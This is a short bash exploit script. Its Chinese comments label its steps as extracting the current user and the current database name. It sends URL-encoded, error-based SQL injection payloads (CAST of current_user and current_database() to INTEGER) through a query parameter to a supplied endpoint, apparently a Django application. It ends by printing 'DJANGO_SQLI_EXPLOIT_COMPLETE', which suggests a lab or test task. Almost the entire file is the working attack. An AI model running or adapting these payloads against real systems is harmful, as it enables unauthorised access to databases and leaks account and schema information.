#!/bin/bash
set -euo pipefail

ENDPOINT="${1:?Usage: $0 <ENDPOINT>}"
PARAM="${2:-date}"

echo "=== 提取当前用户 ==="
resp=$(curl -s "${ENDPOINT}/?${PARAM}=year%27%20AND%201%3DCAST(current_user%20AS%20INTEGER)--%20" --max-time 15 2>/dev/null)
echo "$resp"

echo ""
echo "=== 提取当前数据库名 ==="
resp2=$(curl -s "${ENDPOINT}/?${PARAM}=year%27%20AND%201%3DCAST(current_database()%20AS%20INTEGER)--%20" --max-time 15 2>/dev/null)
echo "$resp2"

echo ""
echo "DJANGO_SQLI_EXPLOIT_COMPLETE"
